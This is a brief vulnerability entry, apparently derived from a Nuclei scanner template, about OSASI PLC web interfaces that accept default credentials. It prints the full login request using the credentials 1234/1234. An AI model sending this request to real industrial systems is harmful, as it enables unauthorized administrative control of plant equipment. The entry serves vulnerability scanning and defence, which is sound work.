# Vulnerability: OSASI PLC - Default Login
**Classification:** OSASI
**Source:** Nuclei Template (`osasi-default-login.yaml`)

## Description
Detected OSASI PLC web interface accessible with default credentials, potentially allowing unauthorized administrative access to industrial control systems.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /users/login HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{RootURL}}/users/login

_method=POST&data[User][loginid]=1234&data[User][passwd]=1234
```

